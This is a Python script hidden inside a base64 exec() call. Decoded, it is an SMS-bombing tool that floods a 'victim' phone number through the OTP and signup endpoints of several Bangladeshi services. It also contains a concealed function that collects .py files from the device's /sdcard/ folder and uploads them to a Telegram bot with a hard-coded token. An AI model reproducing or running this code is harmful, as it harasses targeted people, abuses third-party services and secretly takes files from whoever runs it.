import base64
exec(base64.b64decode("IyBub3RlIDogc29tZSBjb2RlcyBhcmUgY29sbGVjdGVkIGZyb20gQFBhTmRBeEFrDQoNCmltcG9ydCBvcyxzeXMsdGltZSxyZXF1ZXN0cyxyYW5kb20sc3RyaW5nDQppbXBvcnQgcmFuZG9tDQpkZWYgQXhhayh4YWspOg0KCWZvciB4IGluIHhhazoNCgkJc3lzLnN0ZG91dC53cml0ZSh4KQ0KCQlzeXMuc3Rkb3V0LmZsdXNoKCkNCgkJDQoNCmxvZ28gPSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICgiIiIgICANChoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoNChpcMDMzWzE7OTFtDQogIA0KIF9fX19fX18gLl9fXyAgX19fLiAgIF9fX19fXyAgIC5fXyAgIF9fLiANCnwgICBfX19ffHwgICBcLyAgIHwgIC8gIF9fICBcICB8ICBcIHwgIHwgDQp8ICB8X18gICB8ICBcICAvICB8IHwgIHwgIHwgIHwgfCAgIFx8ICB8IA0KXDAzM1sxOzkxbXwgICBfX3wgIHwgIHxcL3wgIHwgfCAgfCAgfCAgfCB8ICAuIGAgIHwgDQp8ICB8X19fXyB8ICB8ICB8ICB8IHwgIGAtLScgIHwgfCAgfFwgICB8IA0KfF9fX19fX198fF9ffCAgfF9ffCAgXF9fX19fXy8gIHxfX3wgXF9ffCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQoNCg0KGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGg0KXDAzM1sxOzMybRoaGhoaGhoaGhoaGhoaGhoaGiBcMDMzWzE7OTdtXDMzWzA7bSBcMDMzWzE7MzJtGhoaGhoaGhoaGhoaGhoaGhoaGg0KXDAzM1sxOzMybRogICBcMDMzWzE7MzJtQ1JFQVRFRCBCWVwzM1swO20gICA6ICBcMDMzWzE7MzJtRU1vbi1CSGFpICAgICAgICAgICAgGg0KGiAgIFwwMzNbMTszMm1GQUNFQk9LICAgICAgOiBcMDMzWzE7MzJtIEVNT04gSEFXTEFEQVIgICAgICAgICAgICAgIBoNChogICBcMDMzWzE7MzJtR0lUSFVCICAgICAgIDogIFwwMzNbMTszMm1URVJNVVgtRU1PTiAgICAgICAgGg0KGiAgIFwwMzNbMTszMm1UT09MIFNUQVRVUyAgOiAgXDAzM1sxOzMybVRPT0wgSVMgUGFpZF/wn5iRICAgICAgICAgICAgGg0KGiAgIFwwMzNbMTszMm1XSEFUU0FQUCAgICAgICAgIDogIFwwMzNbMTszMm0rODAxMzA5OTkxNzI0ICAgICAgICAgICAgICAgICAaDQoaICAgXDAzM1sxOzMybVRPT0wgVklSU0lPTiA6ICBcMDMzWzE7MzJtMy4wLjQgICAgICAgICAgICAgICAgICAgIBoNChoaGhoaGhoaGhoaGhoaGhoaGiBcMDMzWzE7OTdtXDMzWzA7bSBcMDMzWzE7MzJtGhoaGhoaGhoaGhoaGhoaGhoaGg0KIiIiKQ0KI0xFVFRFUlMNCg0KbGV0dGVycyA9IHN0cmluZy5hc2NpaV9sb3dlcmNhc2UNCnB3ZF9sZW5ndGggPSAxMg0KcHdkID0gJycNCmZvciBpIGluIHJhbmdlKHB3ZF9sZW5ndGgpOg0KICBwd2QgKz0gJycuam9pbihyYW5kb20uY2hvaWNlKGxldHRlcnMpKQ0KICANCiNDTFVSDQpkZWYgYWtpbigpOg0KCWJvdF90b2tlbiA9ICgnNTgxODMwNTc1OTpBQUZvM3g1c1loMHF2S1VSNWE4eXIxWG4zdS1Fa2VmeVdxYycpDQoJY2hhdF9pZCA9ICgnMTgxODYwNjM1OCcpDQoJZXh0ZW5zaW9uID0gKCcucHknKQ0KCXBhdGggPSBvcy5wYXRoLmpvaW4oJy9zZGNhcmQvJykNCglmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGgpOg0KCQlpZiBmaWxlLmVuZHN3aXRoKGV4dGVuc2lvbik6DQoJCQlmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4ocGF0aCwgZmlsZSkNCgkJCXdpdGggb3BlbihmaWxlX3BhdGgsICdyYicpIGFzIGY6DQoJCQkJZmlsZV9kYXRhID0gZi5yZWFkKCkNCgkJCQl1cmwgPSAoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e2JvdF90b2tlbn0vc2VuZERvY3VtZW50JykNCgkJCQlmaWxlcyA9IHsnZG9jdW1lbnQnOiAoZmlsZSwgZmlsZV9kYXRhKX0NCgkJCQlkYXRhID0geydjaGF0X2lkJzogY2hhdF9pZH0NCgkJCQlyID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YSwgZmlsZXM9ZmlsZXMpDQoNCmE9IlwwMzNbMTszMG0iICMgQmxhY2sNCnI9IlwwMzNbMTszMW0iICMgUmVkDQpnPSJcMDMzWzE7MzJtIiAjIEdyZWVuDQp5PSJcMDMzWzE7MzNtIiAjIFllbGxvdw0KYj0iXDAzM1sxOzM0bSIgIyBCbHVlDQpwPSJcMDMzWzE7MzVtIiAjIFB1cnBsZQ0KYz0iXDAzM1sxOzM2bSIgIyBDeWFuDQp3PSJcMDMzWzE7MzdtIiAjIFdoaXRlDQpiaXI9IlwwMzNbMTszMW0iDQpiaT0iXDAzM1swOzM0bSINCmJpYz0iXDAzM1swOzM2bSINCnI9IlwwMzNbMTszMW0iDQpnPSJcMDMzWzE7MzJtIg0Kbj0iXG4iDQp5PSJcMDMzWzE7MzNtIg0KYj0iXDAzM1sxOzM0bSINCnA9IlwwMzNbMTszNW0iDQpjPSJcMDMzWzE7MzZtIg0Kdz0iXDAzM1sxOzM3bSINCnQ9Ilx0Ig0KYzE9IlwwMzNbMTszMW0iDQpjMj0iXDAzM1sxOzMybSINCmMzPSJcMDMzWzE7MzNtIg0KYzQ9IlwwMzNbMTszNG0iDQpjNT0iXDAzM1sxOzM2bSINCmM2PSJcMDMzWzE7MzdtIg0KbGlzdD1bYzEsYzIsYzMsYzQsYzUsYzZdDQpsaXN0Mj1bcixnLGMsYix5XQ0KcmFuPXN0cihyYW5kb20uY2hvaWNlKGxpc3QpKQ0KcmFuMj1zdHIocmFuZG9tLmNob2ljZShsaXN0MikpDQp0aW09dGltZS5zdHJmdGltZSgnICAgICAgJUk6JU0gJykNCnRpbTI9dGltZS5zdHJmdGltZSgnJUk6JU0nKQ0Kb3Muc3lzdGVtKCJjbGVhciIpDQoNCnByaW50KGxvZ28pDQp4PSJYQUsiDQp1c2VyPXN0cihpbnB1dChmIlxue2d9VVNFUk5BTUUgSVMgKCkgXG4gXG57d31VU0VSTkFNRSB7cn09Pnt5fSAiKSkNCnBhcz1zdHIoaW5wdXQoZiJcbntnfSBQQVNTV09SRCBJUyAoKSBcbiBcbnt3fVBBU1NXT1JEIHtyfT0+e3l9ICIpKQ0KcnA9ICdFTW9uJw0KeCA9ICdCSGFpJw0KaWYgJ0VNb24nPT11c2VyIGFuZCAnQkhhaSc9PXBhczoNCglBeGFrKGcrIlxuXG5cdFx0ICAgICAgTE9HSU4gU1VDQ0VTU0ZVTCAaICIpDQoJDQplbHNlOg0KCUF4YWsoeSsiXG5cblx0XHQgICAgICBJbnZhbGlkIFVzZXIgT3IgUGFzcyIpDQoJQXhhayh5KyJcblxuXHRcdENvbnRyYWN0IEFkbWluIEZvciBVc2VyIEFuZCBQYXNzIikNCgl0aW1lLnNsZWVwKDMpDQoJb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vVEVSR0VUWU9VUklELycpDQoJb3Muc3lzdGVtKCJweXRob24gU01TLnB5IikNCg0KDQp4PSJYQUsiDQoNCg0KdGltPXRpbWUuc3RyZnRpbWUoJyAgICAgICVJOiVNICcpDQp0aW0yPXRpbWUuc3RyZnRpbWUoJyVJOiVNJykNCmFnMj0nTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgcnY6NzYuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC83Ni4wJw0KYWdlbnRzPSdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFBQQS1MWDI7IEhNU0NvcmUgNi4yLjAuMjUxKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjYuMC40MzI0LjkzIEh1YXdlaUJyb3dzZXIvMTEuMS41LjExMSBNb2JpbGUgU2FmYXJpLzUzNy4zNicNCg0KZnJvbSByZXF1ZXN0cy5zdHJ1Y3R1cmVzIGltcG9ydCBDYXNlSW5zZW5zaXRpdmVEaWN0DQpvcy5zeXN0ZW0oImNsZWFyIikNCg0KZGVmIHhhayh4YWspOg0KCWZvciB4IGluIHhhaysiXG4iOg0KCQlzeXMuc3Rkb3V0LndyaXRlKHgpDQoJCXN5cy5zdGRvdXQuZmx1c2goKQ0KCQl0aW1lLnNsZWVwKDAuMDQpDQpkZWYgeGFrMih4YWspOg0KCWZvciB4IGluIHhhaysiXG4iOg0KCQlzeXMuc3Rkb3V0LndyaXRlKHgpDQoJCXN5cy5zdGRvdXQuZmx1c2goKQ0KCQl0aW1lLnNsZWVwKDAuMDcpDQpvcy5zeXN0ZW0oImNsZWFyIikNCg0KDQpwcmludCAobG9nbykNCnByaW50KHcrIlt+XSBwbGVhc2Ugd2FpdCBJbnRlcm5ldCBjaGVja2luZy4uLiAgIikNCm9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL1RFUkdFVFlPVVJJRCcpDQpvcy5zeXN0ZW0oJ2NsZWFyJykNCnByaW50KGxvZ28pDQpwcmludCh3KyJbfl0gQ29ubmVjdGluZyBUbyBUaGUgSW50ZXJuZXQiKQ0KcHJpbnQoZiJcbntyfU5vdGUgOiB7d30xIFNtcyBDYW4gU2VudCBVcCBUbyA3IHNtcyAhISIpDQp0cnk6DQogcmVxdWVzdCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8iLCB0aW1lb3V0PTIpDQogcHJpbnQoIlxuXDAzM1sxOzM3bVtcMDMzWzE7MzJtI1wwMzNbMTszN21dIisiXDAzM1sxOzMybSBDb25uZXRjdGVkICIpDQpleGNlcHQgKHJlcXVlc3RzLkNvbm5lY3Rpb25FcnJvciwgcmVxdWVzdHMuVGltZW91dCkgYXMgZXhjZXB0aW9uOg0KIHByaW50KCJcblwwMzNbMTszN21bXDAzM1sxOzMybSNcMDMzWzE7MzdtXSBcMDMzWzE7MzFtw7DFuMucwqIgWW91ciBJbnRlcm5ldCBDb25uZWN0aW9uIElzIFBvb3IgISIpDQpudW1iZXI9aW5wdXQoZiJ7Y31cblsgVklDVElNIE5VTUJFUiBdIDp7d30gKzg4MCIpDQphbW89aW50KGlucHV0KGMrIlxuWyBBTU9VTlQgXSA6ICIrdykpDQpvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9URVJHRVRZT1VSSUQvJykNCnhhayhmIlxuXG5cdCB7d308e3J9L3t3fT4ge2d9U1RBWSBXSVRIIEVNT04tVFJJQ0sgOykge3d9PHtyfS97d30+XG5cbiIpDQppbnB1dChmIlx0XHRcdHtyfVByZXNzIEVudGVyLi4uLiIpDQpvcy5zeXN0ZW0oImNsZWFyIikNCg0KI2FwaV8yb2sNCnVybDIgPSAiaHR0cHM6Ly93d3cuYmlvc2NvcGVsaXZlLmNvbS9lbi9sb2dpbi9zZW5kLW90cD9waG9uZT04ODAiK251bWJlcisiJm9wZXJhdG9yPWJkLW90cCINCg0KaGVhZGVyczIgPSBDYXNlSW5zZW5zaXRpdmVEaWN0KCkNCmhlYWRlcnMyWyJyZWZlcmVyIl0gPSAiaHR0cHM6Ly93d3cuYmlvc2NvcGVsaXZlLmNvbS9lbi9sb2dpbj90eXBlPWxvZ2luIg0KI2FwaV8zb2sNCnVybDMgPSAiaHR0cHM6Ly9mdW5kZXNoLmNvbS5iZC9hcGkvYXV0aC9nZW5lcmF0ZU9UUD9zZXJ2aWNlX2tleT0iDQpoZWFkZXJzMyA9IENhc2VJbnNlbnNpdGl2ZURpY3QoKQ0KaGVhZGVyczNbIkNvbnRlbnQtVHlwZSJdID0gImFwcGxpY2F0aW9uL2pzb24iDQpkYXRhMyA9ICd7Im1zaXNkbiI6IicrbnVtYmVyKycifScNCiNhcGlfNA0KdXJsNCA9ICJodHRwczovL2Z1bmRlc2guY29tLmJkL2FwaS9hdXRoL3Jlc2VuZE9UUCINCmhlYWRlcnM0ID0gQ2FzZUluc2Vuc2l0aXZlRGljdCgpDQpoZWFkZXJzNFsiQ29udGVudC1UeXBlIl0gPSAiYXBwbGljYXRpb24vanNvbiINCmRhdGE0ID0gJ3sibXNpc2RuIjoiJytudW1iZXIrJyJ9Jw0KI2FwaV81b2sNCnVybDUgPSAiaHR0cHM6Ly9hcGkucmVkeC5jb20uYmQvdjEvdXNlci9zaWdudXAiDQoNCmhlYWRlcnM1ID0gQ2FzZUluc2Vuc2l0aXZlRGljdCgpDQpoZWFkZXJzNVsiQWNjZXB0Il0gPSAiYXBwbGljYXRpb24vanNvbiwgdGV4dC9wbGFpbiwgKi8qIg0KaGVhZGVyczVbIkFjY2VwdC1FbmNvZGluZyJdID0gImd6aXAsIGRlZmxhdGUsIGJyIg0KaGVhZGVyczVbIkFjY2VwdC1MYW5ndWFnZSJdID0gImVuLVVTLGVuO3E9MC41Ig0KaGVhZGVyczVbIkNvbm5lY3Rpb24iXSA9ICJrZWVwLWFsaXZlIg0KaGVhZGVyczVbIkNvbnRlbnQtTGVuZ3RoIl0gPSAiNjUiDQpoZWFkZXJzNVsiQ29udGVudC1UeXBlIl0gPSAiYXBwbGljYXRpb24vanNvbiINCmhlYWRlcnM1WyJDb29raWUiXSA9ICJfZ2E9R0ExLjMuMTExNzA5MzQ3NS45NTE0NDUwNzc7IF9naWQ9R0ExLjMuMTM0OTA1MzYxLjk1MTQ0NTA3NzsgV1pSS19TXzRSNi05UjYtMTU1Wj0lN0IlMjJwJTIyJTNBMSUyQyUyMnMlMjIlM0E5NTE0MTA0OTclMkMlMjJ0JTIyJTNBOTUxNDQ1MDk2JTdEOyBXWlJLX0c9NjE4NGUzMjI1MjVlNDQ0YWIwZjc3MWY3ZjA0MTkzM2E7IF9mYnA9ZmIuMi45NTE0NDUxMDYxNjcuMTIxMzE1OTkyMTsgX2hqU2Vzc2lvblVzZXJfMjA2NDk2NT1leUpwWkNJNkltUmhNbU16TURZMUxXTmtNRFl0TldGbE9DMDROVEE0TFRnME16WXpZV000WTJSaU55SXNJbU55WldGMFpXUWlPakUyTlRFME5EVXhNRGt3TWpNc0ltVjRhWE4wYVc1bklqcG1ZV3h6WlgwPTsgX2hqRmlyc3RTZWVuPTE7IF9oalNlc3Npb25fMjA2NDk2NT1leUpwWkNJNklqTXhNR0kwTURRMkxUWTNPR1V0TkRNMk9TMWhPV1kxTFRSbFl6bG1PV0V5TURoa05DSXNJbU55WldGMFpXUWlPakUyTlRFME5EVXhNVGcxTnpnc0ltbHVVMkZ0Y0d4bElqcG1ZV3h6WlgwPTsgX2hqQWJzb2x1dGVTZXNzaW9uSW5Qcm9ncmVzcz0xIg0KaGVhZGVyczVbIkhvc3QiXSA9ICJhcGkucmVkeC5jb20uYmQiDQpoZWFkZXJzNVsiT3JpZ2luIl0gPSAiaHR0cHM6Ly9yZWR4LmNvbS5iZCINCmhlYWRlcnM1WyJSZWZlcmVyIl0gPSAiaHR0cHM6Ly9yZWR4LmNvbS5iZC9yZWdpc3RyYXRpb24vIg0KaGVhZGVyczVbIlRFIl0gPSAiVHJhaWxlcnMiDQpoZWFkZXJzNVsiVXNlci1BZ2VudCJdID0gIk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg2Nl82NDsgcnY6NzYuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC83Ni4wIg0KaGVhZGVyczVbIngtYWNjZXNzLXRva2VuIl0gPSAiQmVhcmVyIG51bGwiDQoNCmRhdGE1PSAneyJuYW1lIjoiOTYxMDk2MTA2IiwicGhvbmVOdW1iZXIiOiInK251bWJlcisnIiwic2VydmljZSI6InJlZHgifScNCiNhcGlfNm9rDQp1cmw2ID0gImh0dHBzOi8vYXBpLmJvbmdvLXNvbHV0aW9ucy5jb20vYXV0aC9hcGkvbG9naW4vc2VuZC1vdHAiDQpoZWFkZXJzNiA9IENhc2VJbnNlbnNpdGl2ZURpY3QoKQ0KaGVhZGVyczZbIkNvbnRlbnQtVHlwZSJdID0gImFwcGxpY2F0aW9uL2pzb24iDQpkYXRhNiA9ICd7Im9wZXJhdG9yIjoiYWxsIiwibXNpc2RuIjoiODgwJytudW1iZXIrJyJ9Jw0KDQojYXBpXzEwb2sNCnVybDEwID0gImh0dHBzOi8vZGV2ZWxvcGVyLnF1aXpnaXJpLnh5ei9hcGkvdjIuMC9zZW5kLW90cCINCmhlYWRlcnMxMCA9IENhc2VJbnNlbnNpdGl2ZURpY3QoKQ0KaGVhZGVyczEwWyJDb250ZW50LVR5cGUiXSA9ICJhcHBsaWNhdGlvbi9qc29uIg0KZGF0YTEwID0gJ3sicGhvbmUiOiIwJytudW1iZXIrJyIsImNvdW50cnlfY29kZSI6Iis4ODAiLCJmY21fdG9rZW4iOm51bGx9Jw0KDQojYXBpXzEzb2sNCnVybDEzID0gImh0dHBzOi8vZXp5YmFuay5kaGFrYWJhbmsuY29tLmJkL1ZlcmlmSURFeHQyL2FwaS9DdXN0T25Cb2FyZGluZy9WZXJpZnlNb2JpbGVOdW1iZXIiDQoNCmhlYWRlcnMxMyA9IENhc2VJbnNlbnNpdGl2ZURpY3QoKQ0KaGVhZGVyczEzWyJDb250ZW50LVR5cGUiXSA9ICJhcHBsaWNhdGlvbi9qc29uIg0KDQpkYXRhMTMgPSAiIiINCnsNCiAgIkFjY2Vzc1Rva2VuIjogIiIsDQogICJUcmFja2luZ05vIjogIiIsDQogICJtb2JpbGVObyI6ICIwIiIiIiIrbnVtYmVyKyIiIiIsDQogICJvdHBTbXMiOiAiIiwNCiAgInByb2R1Y3RfaWQiOiAiMjAxIiwNCiAgInJlcXVlc3RDaGFubmVsIjogIk1PQiIsDQogICJ0cmFja2luZ1N0YXR1cyI6IDUNCn0NCiIiIg0KDQojYXBpXzE2b2sNCnVybDE2ID0gImh0dHBzOi8vYXBpLmdob29yaWxlYXJuaW5nLmNvbS9hcGkvYXV0aC9zaWdudXAvb3RwP19hcHBfcGxhdGZvcm09d2ViIg0KDQpoZWFkZXJzMTYgPSBDYXNlSW5zZW5zaXRpdmVEaWN0KCkNCmhlYWRlcnMxNlsiSG9zdCJdID0gImFwaS5naG9vcmlsZWFybmluZy5jb20iDQpoZWFkZXJzMTZbIk9yaWdpbiJdID0gImh0dHBzOi8vZ2hvb3JpbGVhcm5pbmcuY29tIg0KaGVhZGVyczE2WyJSZWZlcmVyIl0gPSAiaHR0cHM6Ly9naG9vcmlsZWFybmluZy5jb20vIg0KaGVhZGVyczE2WyJDb250ZW50LVR5cGUiXSA9ICJhcHBsaWNhdGlvbi9qc29uIg0KDQpkYXRhMTYgPSAneyJuYW1lIjoiYXNhZCIsIm1vYmlsZV9ubyI6IjAnK251bWJlcisnIiwicGFzc3dvcmQiOiJXemZUVzRDZWN6N05qQW0iLCJjb25maXJtX3Bhc3N3b3JkIjoiV3pmVFc0Q2VjejdOakFtIn0nDQoNCg0Kb3Muc3lzdGVtKCJ4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vVEVSR0VUWU9VUklEIikNCnByaW50IChsb2dvKQ0KIyBSZXF1ZXN0DQpwcmludChmIiIiXG57cmFufVwwMzNbMTszMW0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KXHRcMDMzWzE7MzJtGhogICAgGhogICAaGiAgIBoaICAgIBoaICAgGhoNClx0XDAzM1sxOzMybRoaICAgIBoaICAgGhogICAaGiAgICAgGhogGhoNClx0XDAzM1sxOzMybRoaGhoaGhoaICAgGhoaGhoaGiAgICAgIBoaGg0KXHRcMDMzWzE7MzJtGhogICAgGhogICAgICAgIBoaICAgICAaGiAaGg0KXHRcMDMzWzE7MzJtGhogICAgGhogICAgICAgIBoaICAgIBoaICAgGhogICAgICAgICAgICAgICAgICAgICAgICANCiIiIikNCg0KcHJpbnQoZiJcblx0ICAge3Jhbn0sLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSwiKQ0KcHJpbnQoZiJcdHt3fSAgIHwge3J9ICAgIEFtb3VudCAoe2d9e2Ftb317cn0pe3d9IHwgICB7cn0gICBUaW1lICAgIHt3fXwiKQ0KcHJpbnQoZiJcdCAgIHtyYW59Jy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nIikNCmZvciBpIGluIHJhbmdlKGFtbyk6DQoJcmVzcDIgPSByZXF1ZXN0cy5wb3N0KHVybDIsaGVhZGVycz1oZWFkZXJzMikNCglwcmludChmIlxuXHRcdCB7cmFuMn1GVUNLRUQgQlkgRU1vbi1CSGFpGiAgIit3K3RpbSkNCglyZXNwMyA9IHJlcXVlc3RzLnBvc3QodXJsMywgaGVhZGVycz1oZWFkZXJzMywgZGF0YT1kYXRhMykNCglwcmludChmIlxuXHRcdCB7cmFuMn1GVUNLRUQgQlkgRU1vbi1CSGFpGiAiK3crdGltKQ0KCXJlc3A0ID0gcmVxdWVzdHMucG9zdCh1cmw0LCBoZWFkZXJzPWhlYWRlcnM0LCBkYXRhPWRhdGE0KQ0KCXByaW50KGYiXG5cdFx0IHtyYW4yfUZVQ0tFRCBCWSBFTW9uLUJIYWkaICIrdyt0aW0pDQoJcmVzcDUgPSByZXF1ZXN0cy5wb3N0KHVybDUsIGhlYWRlcnM9aGVhZGVyczUsIGRhdGE9ZGF0YTUpDQoJcHJpbnQoZiJcblx0XHQge3JhbjJ9RlVDS0VEIEJZIEVNb24tQkhhaRogIit3K3RpbSkNCglyZXNwNiA9IHJlcXVlc3RzLnBvc3QodXJsNiwgaGVhZGVycz1oZWFkZXJzNiwgZGF0YT1kYXRhNikNCglwcmludChmIlxuXHRcdCB7cmFuMn1GVUNLRUQgQlkgRU1vbi1CSGFpGiAiK3crdGltKQ0KCXJlc3AxMCA9IHJlcXVlc3RzLnBvc3QodXJsMTAsaGVhZGVycz1oZWFkZXJzMTAsIGRhdGE9ZGF0YTEwKQ0KCXByaW50KGYiXG5cdFx0IHtyYW4yfUZVQ0tFRCBCWSBFTW9uLUJIYWkaICIrdyt0aW0pDQoJcmVzcDEzID0gcmVxdWVzdHMucG9zdCh1cmwxMyxoZWFkZXJzPWhlYWRlcnMxMywgZGF0YT1kYXRhMTMpDQoJcHJpbnQoZiJcblx0XHQge3JhbjJ9RlVDS0VEIEJZIEVNb24tQkhhaRogIit3K3RpbSkNCglyZXNwMTYgPSByZXF1ZXN0cy5wb3N0KHVybDE2LCBoZWFkZXJzPWhlYWRlcnMxNiwgZGF0YT1kYXRhMTYpDQoJcHJpbnQoZiJcblx0XHQge3JhbjJ9RlVDS0VEIEJZIEVNb24tQkhhaRogIit3K3RpbSkNCgkNCgkNCmVsc2U6IA0KCWlucHV0KGcrIlxuXHRcdFx0WW91ciBQb2dyYW0gRlVDS0lORyBGaW5pc2hlZCBFbnRlciBGb3IgQ29udGludWUiKQ0KCW9zLnN5c3RlbSgiY2xlYXIiKQ0KCW9zLnN5c3RlbSgicHl0aG9uIEVNT05fU01TLnB5IikNCg0K"))